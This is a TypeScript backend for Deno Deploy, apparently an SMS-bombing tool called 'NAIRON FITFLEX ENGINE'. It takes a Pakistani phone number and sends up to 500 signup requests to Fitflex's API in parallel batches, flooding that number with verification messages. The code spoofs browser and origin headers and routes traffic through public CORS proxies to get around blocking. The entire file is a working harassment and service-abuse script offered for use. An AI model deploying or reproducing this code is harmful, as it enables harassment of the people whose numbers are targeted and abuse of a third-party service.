// main.ts — Deno Deploy backend
// Sirf Fitflex. User count × 10 multiplier.

const FITFLEX_URL = 'https://prod.fitflexapp.com/api/users/signupV1';
const UA = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36';

const CORS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type, X-Auth-Token',
};

const MULTIPLIER = 10;        // 🔥 user × 10
const MAX_ACTUAL = 500;       // hard cap (Deno safe)
const BATCH_SIZE = 25;

const FITFLEX_PROXIES: ((u: string) => string)[] = [
  (u) => u,
  (u) => 'https://api.allorigins.win/raw?url=' + encodeURIComponent(u),
  (u) => 'https://corsproxy.io/?' + encodeURIComponent(u),
  (u) => 'https://api.codetabs.com/v1/proxy?quest=' + encodeURIComponent(u),
  (u) => 'https://thingproxy.freeboard.io/fetch/' + u,
];

function toIntl(num: string): string {
  let s = String(num).replace(/\D/g, '');
  if (s.startsWith('0')) s = s.slice(1);
  if (!s.startsWith('92')) s = '92' + s;
  return s;
}

function log(tag: string, msg: string) {
  console.log(`[${new Date().toISOString()}] [${tag}] ${msg}`);
}

type FitflexResult = {
  status: number;
  body: string;
  error?: string;
  sent: boolean;
  via?: string;
};

async function tryOneFitflex(
  url: string,
  payload: string,
  headers: Record<string, string>,
  timeoutMs: number
): Promise<{ status: number; body: string }> {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeoutMs);
  try {
    const res = await fetch(url, {
      method: 'POST',
      signal: controller.signal,
      headers,
      body: payload,
    });
    clearTimeout(timer);
    const txt = await res.text();
    return { status: res.status, body: txt };
  } catch (e) {
    clearTimeout(timer);
    throw e;
  }
}

async function fireFitflex(msisdn: string, idx: number): Promise<FitflexResult> {
  const payload = JSON.stringify({
    msisdn: msisdn,
    type: 'msisdn',
    device_name: 'Netscape',
    app_version: '1.0',
    user_platform: UA,
  });

  const directHeaders: Record<string, string> = {
    'Content-Type': 'application/json',
    'Accept': '*/*',
    'Accept-Language': 'en-PK,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'Origin': 'https://fitflexapp.com',
    'Referer': 'https://fitflexapp.com/',
    'User-Agent': UA,
    'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'Sec-Fetch-Site': 'same-site',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
  };

  const proxyHeaders: Record<string, string> = {
    'Content-Type': 'application/json',
    'User-Agent': UA,
  };

  const racePromises = FITFLEX_PROXIES.map((buildUrl, i) => {
    const isDirect = i === 0;
    const url = buildUrl(FITFLEX_URL);
    const headers = isDirect ? directHeaders : proxyHeaders;
    const layerName = isDirect ? 'DIRECT' : `PROXY${i}`;
    return tryOneFitflex(url, payload, headers, 8000)
      .then(r => ({ ...r, layerName }))
      .catch(() => ({ status: 0, body: '', layerName }));
  });

  try {
    const results = await Promise.all(racePromises);
    const good = results.find(r => r.status >= 200 && r.status < 300);

    if (good) {
      log(`FITFLEX #${idx}`, `${good.layerName} → HTTP ${good.status}`);
      return {
        status: good.status,
        body: good.body,
        sent: true,
        via: good.layerName,
      };
    }

    const best = results.reduce((a, b) => (b.status > a.status ? b : a));
    log(`FITFLEX #${idx}`, `NO-2XX (best=${best.layerName} ${best.status})`);
    return {
      status: best.status,
      body: best.body,
      sent: false,
      via: best.layerName,
    };
  } catch (e) {
    const msg = e instanceof Error ? e.message : String(e);
    log(`FITFLEX #${idx}`, `ALL FAILED: ${msg}`);
    return { status: 0, body: '', error: msg, sent: false };
  }
}

async function runInBatches<T>(tasks: (() => Promise<T>)[], batchSize: number): Promise<T[]> {
  const results: T[] = [];
  for (let i = 0; i < tasks.length; i += batchSize) {
    const batch = tasks.slice(i, i + batchSize);
    const batchResults = await Promise.all(batch.map(fn => fn()));
    for (const r of batchResults) results.push(r);
  }
  return results;
}

Deno.serve(async (req: Request) => {
  const url = new URL(req.url);

  if (req.method === 'OPTIONS') {
    return new Response(null, { status: 204, headers: CORS });
  }

  // -------- /debug --------
  if (url.pathname === '/debug') {
    const num = (url.searchParams.get('num') || '').trim();
    if (!num) {
      return new Response(JSON.stringify({ ok: false, error: 'no num' }), {
        status: 400,
        headers: { 'Content-Type': 'application/json', ...CORS },
      });
    }
    const f = await fireFitflex(toIntl(num), 0);
    return new Response(
      JSON.stringify({
        fitflex: {
          status: f.status,
          sent: f.sent,
          via: f.via || null,
          body: f.body.slice(0, 1000),
          error: f.error || null,
        },
      }),
      { status: 200, headers: { 'Content-Type': 'application/json', ...CORS } }
    );
  }

  // -------- /run --------
  if (url.pathname === '/run') {
    const num = (url.searchParams.get('num') || '').trim();
    const countStr = url.searchParams.get('count') || '10';
    let userCount = parseInt(countStr, 10);
    if (!Number.isFinite(userCount) || userCount < 1) userCount = 10;
    if (userCount > 50) userCount = 50; // user max 50 (× 10 = 500 actual)

    if (!num) {
      return new Response(JSON.stringify({ ok: false, error: 'no number' }), {
        status: 400,
        headers: { 'Content-Type': 'application/json', ...CORS },
      });
    }

    // 🔥 MULTIPLY by 10
    const actualCount = Math.min(userCount * MULTIPLIER, MAX_ACTUAL);
    const msisdn = toIntl(num);
    const t0 = Date.now();

    log('API', `Burst START num=${num} intl=${msisdn} userCount=${userCount} actualCount=${actualCount}`);

    const tasks: (() => Promise<FitflexResult>)[] = [];
    for (let i = 1; i <= actualCount; i++) {
      const idx = i;
      tasks.push(() => fireFitflex(msisdn, idx));
    }

    const results = await runInBatches(tasks, BATCH_SIZE);

    let sent = 0, fail = 0;
    const samples: string[] = [];
    const viaCount: Record<string, number> = {};

    for (const r of results) {
      if (r.sent) {
        sent++;
        viaCount[r.via || 'UNKNOWN'] = (viaCount[r.via || 'UNKNOWN'] || 0) + 1;
        if (samples.length < 3) samples.push(`${r.via}: ${r.body.slice(0, 130)}`);
      } else {
        fail++;
        if (samples.length < 3) samples.push(`FAIL(${r.via || '?'} ${r.status}): ${r.body.slice(0, 130)}`);
      }
    }

    const elapsed = ((Date.now() - t0) / 1000).toFixed(2);
    log('BURST', `DONE in ${elapsed}s | SENT ${sent}/${actualCount} | FAIL ${fail}/${actualCount}`);

    return new Response(
      JSON.stringify({
        ok: true,
        msisdn,
        userCount,
        multiplier: MULTIPLIER,
        actualCount,
        elapsed: parseFloat(elapsed),
        fitflex: {
          sent,
          fail,
          via: viaCount,
          samples,
        },
        total: results.length,
      }),
      { status: 200, headers: { 'Content-Type': 'application/json', ...CORS } }
    );
  }

  return new Response(
    JSON.stringify({
      ok: true,
      service: 'NAIRON FITFLEX ENGINE × 10',
      endpoints: ['/run?num=03XXXXXXXXX&count=10', '/debug?num=03XXXXXXXXX'],
    }),
    { status: 200, headers: { 'Content-Type': 'application/json', ...CORS } }
  );
});
